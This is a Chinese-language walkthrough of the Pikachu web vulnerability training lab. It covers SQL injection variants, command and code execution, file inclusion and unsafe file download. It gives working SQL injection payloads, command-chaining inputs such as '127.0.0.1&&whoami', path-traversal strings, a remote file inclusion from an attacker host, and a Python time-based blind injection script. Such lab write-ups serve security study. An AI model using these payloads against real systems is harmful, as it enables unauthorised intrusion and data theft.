+<h3 id="delete-注入"><a href="#delete-注入" class="headerlink" title="delete 注入"></a>delete 注入</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/3436af9562490fb36ad176cdaa717dc4.png"></p>
+<p>添加任意语句并点击删除按钮，使用 burp 进行抓包</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/b47c9111c35c4a2b71ecf2c1913ac828.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/781f44bc8e04103f56242c8b92093d01.png"></p>
+<p>将该请求发送至 repeater 模块中进行测试，给参数 id 添加单引号，发现响应包会出现 sql 报错</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/4ea23b798d6b6bafd2748ad0176a176d.png"></p>
+<p>本关的 sql 语句，由于 id 为数字所以在注入时无需使用单引号进行闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(array_key_exists(**&#x27;id&#x27;**, $_GET))&#123;</span><br><span class="line">  $query = &quot;delete from message where id = &#123;$$_GET[&#x27;id&#x27;]&#125;&quot;;</span><br><span class="line">  ...&#125;</span><br></pre></td></tr></table></figure>
+
+<p>本关还是使用报错注入的 payload，如下所示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">59+and+updatexml(1,concat(0x7e,(select+database()),0x7e),1)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/3766734ba147702f1752f22338829c9b.png"></p>
+<h3 id="http-header-注入"><a href="#http-header-注入" class="headerlink" title="http header 注入"></a>http header 注入</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/eb098a2ae1906bc7d9f947414d3c6630.png"></p>
+<p>输入账号密码<code>admin</code> <code>123456</code>点击登录</p>
+<p>登录后可以看到 header 的 ua 和 accept 等信息被展示出来了，此处我们可以尝试去注入</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/a9c04b021a3b08a8840caeb580c282c6.png"></p>
+<p>本关的 sql 语句如下：直接获取前端过来的头信息, 没有任何处理就存储到数据库中了</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/393d398285aeecb0ca5b6d16f8dbad7a.png"></p>
+<p>接下来我们尝试进行注入，在 user agent 内容后加入单引号发现报错，路径如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/vul/sqli/sqli_header/sqli_header.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/0ece8bfcd8b9a30a15dbe949fcbc9a4f.png"></p>
+<p>使用以下 payload 获取数据库信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;and+updatexml(1,concat(0x7e,(select+database()),0x7e),1)+--+&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d8c81582837de3a8806cb7953695bc31.png"></p>
+<h3 id="盲注-base-on-boolian"><a href="#盲注-base-on-boolian" class="headerlink" title="盲注 (base on boolian)"></a>盲注 (base on boolian)</h3><blockquote>
+<p>布尔盲注就是猜测，根据页面返回的 true 和 flase 猜数据库总数，猜数据库长度，猜数据库名字，猜数据库长度，猜数据库内容，然后就是猜表和字段。盲注最快的方法就是用工具跑。</p>
+</blockquote>
+<p>burp暴力跑a-z，4位数跑出4个。<img src="/images/Pasted%20image%2020230411192455.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/0fbdcba57c306e97be15e2fc95a20e1a.png"></p>
+<p>输入<code>123</code>可以查到该用户存在并返回 uid 和 email，输入<code>1</code>则提示用不存在，判断此处可能存在布尔盲注</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/835dab4bd65f83a6a8b56577521cc41e.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6ecafa6d5e8b23c3f0b88364143b1c20.png"></p>
+<p>使用以下 payload 进行注入，使用以下 sql payload 根据页面返回的信息 (用户存在 &#x2F; 不存在，即 true&#x2F;false) 来判断数据库名的长度，注意此处的<code>123</code>用户为真实存在的，如果使用不存在的用户使用此 payload 无法获得正确的结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">123&#x27;and length(database())=7%23</span><br><span class="line"></span><br><span class="line">URL解码后：</span><br><span class="line">&#x27;and length(database())=7#</span><br><span class="line"># 注意最后的#必须使用URL编码</span><br></pre></td></tr></table></figure>
+
+<p>当长度等于 6 时，页面提示 username 不存在</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/055278fd9383caf34873ee2119a41744.png"></p>
+<p>当长度等于 7 时，页面显示了用户的 uid 和 email，所以判断数据库名的长度为 7</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/561eed0b59a2f51cd3c46bfba99975c7.png"></p>
+<p>接下来使用 burp 爆破完整数据库名称，使用以下 payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&#x27; and substr(database(),1,1)=&#x27;a&#x27; --+</span><br></pre></td></tr></table></figure>
+
+<p>插入<br><img src="/images/Pasted%20image%2020230412110911.png"></p>
+<p><img src="/images/Pasted%20image%2020230411193242.png"><br>这是一个包含参数的URL，其中包含了一个潜在的SQL注入漏洞。让我为您解释一下：</p>
+<ul>
+<li><p><code>http://121.36.98.179:8083/vul/sqli/sqli_blind_b.php</code>：这是一个URL，指向一个名为<code>sqli_blind_b.php</code>的PHP脚本，位于IP地址为<code>121.36.98.179</code>，端口号为<code>8083</code>的Web服务器上。</p>
+</li>
+<li><p><code>?name=jack&#39; and substr(database(),1,1)=&#39;a&#39; --+</code>：这是URL中的查询参数部分，通过GET方法将参数<code>name</code>的值设置为<code>jack&#39; and substr(database(),1,1)=&#39;a&#39; --+</code>传递给<code>sqli_blind_b.php</code>脚本。在这里，<code>name</code>参数的值被设置为一个包含SQL注入代码的字符串。</p>
+</li>
+<li><p><code>jack&#39; and substr(database(),1,1)=&#39;a&#39;</code>：这是一个潜在的SQL注入攻击&#x3D;&#x3D;载荷&#x3D;&#x3D;，通过在<code>name</code>参数值中注入SQL代码来尝试从数据库中获取信息。具体来说，这个注入攻击载荷试图通过&#x3D;&#x3D;检查数据库中第一个字符是否为字母<code>a</code>来探测数据库的名称&#x3D;&#x3D;。<code>substr(database(),1,1)</code>表示从数据库名称的&#x3D;&#x3D;第一个字符开始截取一个字符&#x3D;&#x3D;。</p>
+</li>
+<li><p><code>--+</code>：这是一个SQL注释符号，用于注释掉SQL代码后面的部分，以防止在执行SQL查询时出现语法错误。</p>
+</li>
+</ul>
+<p>总的来说，这个URL中的参数<code>name</code>的值包含了一个潜在的SQL注入攻击载荷，试图通过检查数据库名称的第一个字符是否为字母<code>a</code>来利用<code>sqli_blind_b.php</code>脚本中的SQL注入漏洞。<br><img src="/images/Pasted%20image%2020230412111631.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d5f31d1bd6e2d67383185886d7ac6029.png"></p>
+<p>设置长度 1-10</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/5e84aa2ce38720522782a7e7ae0f35a3.png"></p>
+<p>设置要爆破的字符<code>a-z</code>和<code>_</code></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/442a79f19fb35864858f3487082c53c7.png"></p>
+<p>然后点击右上角的开始攻击，按照顺序拼写得到<code>pikachu</code></p>
+<p><img src="/images/Pasted%20image%2020230412111938.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/299f83237cf2292f25545c93eaadb63e.png"></p>
+<h3 id="盲注-base-on-time"><a href="#盲注-base-on-time" class="headerlink" title="盲注 (base on time)"></a>盲注 (base on time)</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/4609c9e50ce1e8aceb1da6140caf91bc.png"></p>
+<p>本关的 sql 语句：</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/538ee62761caacb5d9f5f41c6c933d06.png"></p>
+<p>输入任意内容点击查询都会提示<code>i don&#39;t care who you are!</code>所以我们这里可以通过时间盲注进行测试，根据返回包的响应时间判断注入的 sql 语句有没有被执行，使用以下 payload 判断是否存在时间盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 当数据库名称的长度大于1时，则执行sleep(6)休眠6秒返回结果</span><br><span class="line">&#x27; and if(length(database())&gt;1,sleep(6),1) --+</span><br></pre></td></tr></table></figure>
+<p>这个查询尝试通过判断数据库名的长度是否大于 1 来进行条件判断。如果数据库名长度大于 1，则会执行 <code>SLEEP(6)</code> 函数，导致查询延时 6 秒钟；否则，会执行 <code>1</code>，即没有延时。</p>
+<p>通过观察延时的情况，攻击者可以根据查询的延时时间推断出数据库名的长度是否满足条件，从而逐位地获取数据库名的信息。这种方法在时间盲注攻击中常用于绕过一些安全措施，例如在错误消息中不返回具体的数据库信息，从而获取数据库结构和数据的敏感信息。<br><img src="/images/Pasted%20image%2020230412154638.png"></p>
+<p>未插入 payload 时响应时间为 11 毫秒<br><img src="/images/Pasted%20image%2020230412153409.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/8d799de220c9374b6295b1de33df0ce8.png"></p>
+<p>插入 payload 且条件成立的情况下响应时间为 20 秒（延迟了输入时间的 1 倍），证明此处存在时间盲注</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/038f78a561243d2e7251c988b8955406.png"></p>
+<p>接下来判断长度，当 length 大于 6 时执行了延迟（true），而当 length 大于 7 时直接返回了结果没有执行延迟（false），这就证明数据库名的长度等于 7</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/013e16d78bb0a207a5471233ae4a69f0.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/563a8791c56501e18ff32d08c914b825.png"></p>
+<p>接下来进行爆破数据库名称</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+and+if(substr(database(),1,1)=&#x27;p&#x27;,sleep(3),1)+--+</span><br></pre></td></tr></table></figure>
+
+<p>本关的爆破方式与布尔盲注相同，将请求包发送至 Intruder 模块进行爆破即可，当执行结果为 true 时也会进行 sleep 延时</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/b7fc63e1e191b3d754b428b94c47c7bb.png"></p>
+<p><strong>推荐使用python直接脚本跑一下:</strong> burp检测时间不好用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line"><span class="keyword">import</span> string  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 目标 URLurl = &#x27;http://121.36.98.179:8083/vul/sqli/sqli_blind_t.php?&#x27;  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 构造参数  </span></span><br><span class="line">column = <span class="string">&#x27;database()&#x27;</span>  <span class="comment"># 要查询的列名  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 循环尝试不同的位置和值  </span></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">8</span>):  <span class="comment"># 1 到 7 的循环  </span></span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> string.ascii_lowercase:  <span class="comment"># 小写字母 a 到 z 的循环  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment"># 构建 SQL 注入查询字符串  </span></span><br><span class="line">        sql_query = <span class="string">f&quot;name=lili&#x27; and if(substr(<span class="subst">&#123;column&#125;</span>,<span class="subst">&#123;index&#125;</span>,1)=&#x27;<span class="subst">&#123;value&#125;</span>&#x27;,sleep(3),1) --+&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span>  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># 组合url  </span></span><br><span class="line">        url_1 = url + sql_query  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            <span class="comment"># 发送请求并记录开始时间  </span></span><br><span class="line">            start_time = time.perf_counter()  </span><br><span class="line">            response = requests.get(url_1)  </span><br><span class="line">            <span class="comment"># 计算请求响应时间  </span></span><br><span class="line">            elapsed_time = time.perf_counter() - start_time  </span><br><span class="line">  </span><br><span class="line">            <span class="comment"># 检查响应时间，这里根据具体情况来确定是否存在 SQL 注入漏洞  </span></span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;= <span class="number">3</span>:  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;位置：<span class="subst">&#123;index&#125;</span>，值：<span class="subst">&#123;value&#125;</span>，可能存在 SQL 注入漏洞&quot;</span>)  </span><br><span class="line">                <span class="comment"># 判断响应时间是否超过 3 秒，根据具体情况调整  </span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;注入成功&#x27;</span>)  </span><br><span class="line">            <span class="keyword">else</span>:  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;位置：<span class="subst">&#123;index&#125;</span>，值：<span class="subst">&#123;value&#125;</span>，未发现 SQL 注入漏洞&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;请求发生异常:&#x27;</span>, e)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 简单检测  </span></span><br><span class="line"><span class="comment"># import requests  </span></span><br><span class="line"><span class="comment"># import time  </span></span><br><span class="line"><span class="comment"># import string  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># url = &#x27;http://121.36.98.179:8083/vul/sqli/sqli_blind_t.php?&#x27;  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># sql_query = f&quot;name=lili&#x27; and if(substr(database(),1,1)=&#x27;p&#x27;,sleep(3),1) --+&amp;submit=%E6%9F%A5%E8%AF%A2&quot;  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># url_1=url+sql_query  </span></span><br><span class="line"><span class="comment"># print(requests.get(url=url_1).elapsed.total_seconds())</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="宽字节注入-wide-byte-注入"><a href="#宽字节注入-wide-byte-注入" class="headerlink" title="宽字节注入 (wide byte 注入)"></a>宽字节注入 (wide byte 注入)</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/72105b3f66d51633f36fdbd49c8c156c.png"></p>
+<p>宽字节注入是通过编码绕过后端代码的防御措施，列如正则过滤和转义函数转义。</p>
+<p>客户端采用 GBK 编码格式，数据库对用户输入进行转义<code>\</code> ，转移符<code>\</code>的编码为 %5c，添加编码 %df, 组成 %df%5c，此时编码表达为繁体字連，从而绕过转义符让<code>&#39;</code>逃逸。</p>
+<p>使用以下 payload 进行 sql 注入，判断存在宽字节注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">-</span>vinceB<span class="string">&#x27;union select 1,2#</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/Pasted%20image%2020230412193500.png"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe<span class="operator">%</span>df<span class="string">&#x27;+or+1=1+--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/df78bc57ee83533ef874f8754ef35749.png"></p>
+<p>接下来使用 order by 判断 sql 中查询的列数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kobe<span class="operator">%</span>df<span class="operator">%</span><span class="number">27</span><span class="operator">+</span><span class="keyword">order</span><span class="operator">+</span><span class="keyword">by</span><span class="operator">+</span><span class="number">2</span><span class="operator">+</span><span class="comment">--+ 页面未报错</span></span><br><span class="line">kobe<span class="operator">%</span>df<span class="operator">%</span><span class="number">27</span><span class="operator">+</span><span class="keyword">order</span><span class="operator">+</span><span class="keyword">by</span><span class="operator">+</span><span class="number">3</span><span class="operator">+</span><span class="comment">--+ 页面报错，判断有2列</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/00919b406447985a44af6800253ec61e.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/acf74ba5aa23742b97aecd9c5905afc3.png"></p>
+<p>接下来使用 union 联合查询获取数据库名和版本号</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">%</span><span class="number">2</span>dvince<span class="operator">%</span>df<span class="operator">%</span><span class="number">27</span><span class="keyword">union</span><span class="operator">+</span><span class="keyword">select</span><span class="operator">+</span><span class="keyword">user</span><span class="operator">%</span><span class="number">28</span><span class="operator">%</span><span class="number">29</span><span class="operator">%</span><span class="number">2</span>cdatabase<span class="operator">%</span><span class="number">28</span><span class="operator">%</span><span class="number">29</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/Pasted%20image%2020230412194930.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe%df%27+union+select+database(),version()+--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/e2cc8ae0e4514abe7081888c9788dd20.png"></p>
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>RCE(remote command&#x2F;code execute) 概述</p>
+<p>RCE 漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p>
+<p><strong>远程系统命令执行</strong></p>
+<p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口</p>
+<p>比如我们常见的路由器、防火墙、入侵检测等设备的 web 管理界面上</p>
+<p>一般会给用户提供一个 ping 操作的 web 界面，用户从 web 界面输入目标 IP，提交后，后台会对该 IP 地址进行一次 ping 测试，并返回测试结果。 而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交 “意想不到” 的命令，从而让后台进行执行，从而控制整个后台服务器</p>
+<p>现在很多的甲方企业都开始实施自动化运维, 大量的系统操作会通过 “自动化运维平台” 进行操作。 在这种平台上往往会出现远程系统命令执行的漏洞, 不信的话现在就可以找你们运维部的系统测试一下, 会有意想不到的 “收获”- _-</p>
+<p><strong>远程代码执行</strong></p>
+<p>同样的道理, 因为需求设计, 后台有时候也会把用户的输入作为代码的一部分进行执行, 也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数, 还是使用了不安全的反序列化等等。</p>
+<p>因此，如果需要给前端用户提供操作类的 API 接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。</p>
+<h3 id="exec-“ping”"><a href="#exec-“ping”" class="headerlink" title="exec “ping”"></a>exec “ping”</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/f860c9801e28b0ce70bc8a810e9d0149.png"></p>
+<p>本关代码：直接将变量拼接进来，没做处理</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/2462c6e72a0d852576192796095613bb.png"></p>
+<p>我们先输入 127.0.0.1 然后 ping 一下试试，可以正常返回 ping 命令的结果</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/eefe4998d82ad694b6b76d629cb72a91.png"></p>
+<p>接下来进行漏洞利用，尝试拼接命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;&amp;whoami</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/b70da39b4f84e1aff0d23aa161783182.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;&amp;dir</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/7f492559decbc725023e5c179efafc85.png"></p>
+<h3 id="exec-“eval”"><a href="#exec-“eval”" class="headerlink" title="exec “eval”"></a>exec “eval”</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/73d16e9f217558fa2e2142524364968e.png"></p>
+<p>本关代码分析：这里直接用 eval 执行了 post 传递过来的 txt 的值</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/fcf3d4a8bae774f5c5548e85a3473edf.png"></p>
+<p>本关有多种利用方式，比如直接输入<code>phpinfo();</code></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/1b58a65ab88c35295f2f10751c29b3b9.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/afb34356e7d6daba2f3fb25165dd5b0b.png"></p>
+<p>本关的代码其实就是个一句话木马了<code>eval($_POST[&#39;txt&#39;]</code>，我们甚至可以直接使用蚁剑进行连接：)，配置如下：</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/1c6ead8d3f1384715338af9974ccf714.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/b42cdfa32651007d714d3a462985ac01.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/af4cdc67c9015157ece21d11d596e36d.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/f343d61cd466b0e5143778265c773f63.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/e9680b1cd284d980ec3136bd91035f95.png"></p>
+<h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><p>File Inclusion(文件包含漏洞) 概述</p>
+<p>文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在 PHP 中，提供了：<br>include(),include_once()<br>require(),require_once()<br>这些文件包含函数，这些函数在代码设计中被经常使用到。 大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个 “意想不到” 的文件让包含函数去执行，从而造成恶意操作。</p>
+<p>根据不同的配置环境，文件包含漏洞分为如下两种情况：</p>
+<p><strong>1. 本地文件包含漏洞：</strong> 仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。</p>
+<p><strong>2. 远程文件包含漏洞：</strong> 能够通过 url 地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。</p>
+<p>因此，在 web 应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。</p>
+<h3 id="File-Inclusion-local"><a href="#File-Inclusion-local" class="headerlink" title="File Inclusion(local)"></a>File Inclusion(local)</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/5008d2404e83e39142b33924034ef3de.png"></p>
+<p>由于搭建本靶场使用的是 Windows 系统，所以本关可以利用本地文件包含漏洞包含一些 Windows 系统中的敏感文件，比如<code>hosts</code>文件，直接将 URL 中的 filename 的值修改为以下路径即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..\..\..\..\..\..\windows\system32\drivers\etc\hosts</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/f417a0e3f1a05cb5323451642179e5ee.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/9c52f41467c89b4e2026c6a23d0146a2.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/2e2dd86dfe8c80c76b2ed4aeeed48da4.png"></p>
+<h3 id="File-Inclusion-remote"><a href="#File-Inclusion-remote" class="headerlink" title="File Inclusion(remote)"></a>File Inclusion(remote)</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/2526f8a5d7830f1d0fa0c33e24845687.png"></p>
+<p>allow_url_include &#x3D; Off 是否允许 include&#x2F;require 打开 URL（如 http：&#x2F;&#x2F; 或 ftp：&#x2F;&#x2F;）作为文件处理。</p>
+<p>注意：从<code>PHP5.2</code>开始<code>allow_url_include</code>就<strong>默认</strong>为<code>Off</code>了</p>
+<p>这里我们需要修改下 php.ini 配置文件，保存后重启 Apache 服务</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/0460b88a6293f32f3109123f9641d18d.png"></p>
+<p>再次访问已经正常了</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/af5bbedec1a5b7de939b2fccf653f5a5.png"></p>
+<p>由于本关是远程文件包含，所以这里我们需要准备一台攻击机，在这台攻击机上创建以下 php 文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/a6767cef798ad3b8a4606a4029bcc247.png"></p>
+<p>然后使用 python 启动 http 服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8080</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/b653cba5ec38ee8a376f7edfb14a0b35.png"></p>
+<p>此时将攻击机 php 文件的 URL 粘贴到 filename 的参数中，访问后成功显示了 phpinfo 的页面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=http://192.168.0.106:8080/a.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/9d6a98d61cddbbbd74902210f3141cf1.png"></p>
+<h2 id="Unsafe-Filedownload"><a href="#Unsafe-Filedownload" class="headerlink" title="Unsafe Filedownload"></a>Unsafe Filedownload</h2><p>文件下载功能在很多 web 系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件 response 给浏览器，从而完成下载。 如果后台在收到请求的文件名后, 将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。<br>此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径 (比如…&#x2F;…&#x2F;…&#x2F;etc&#x2F;passwd), 则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等) 被下载。</p>
+<p>所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。 切记：所有与前端交互的数据都是不安全的，不能掉以轻心！</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/3fd6f2280245e2aebc0be61ec7db6322.png"></p>
+<p>根据提示信息已知点击球员名字即可下载头像图片</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/9b8a71533f4cfe150f19e18785a8434d.png"></p>
+<p>这里可以使用 burp 看下下载的请求包内容，此处传入了图片的文件名然后进行下载</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/5020cd2c77be2a1b5f3d1f394942b486.png"></p>
+<p>本关我们仍然可以将 filename 设置为 hosts 文件的路径，然后进行下载</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..\..\..\..\..\..\windows\system32\drivers\etc\hosts</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d93e39b0c16e9aac24d7fd868f35cf15.png"></p>
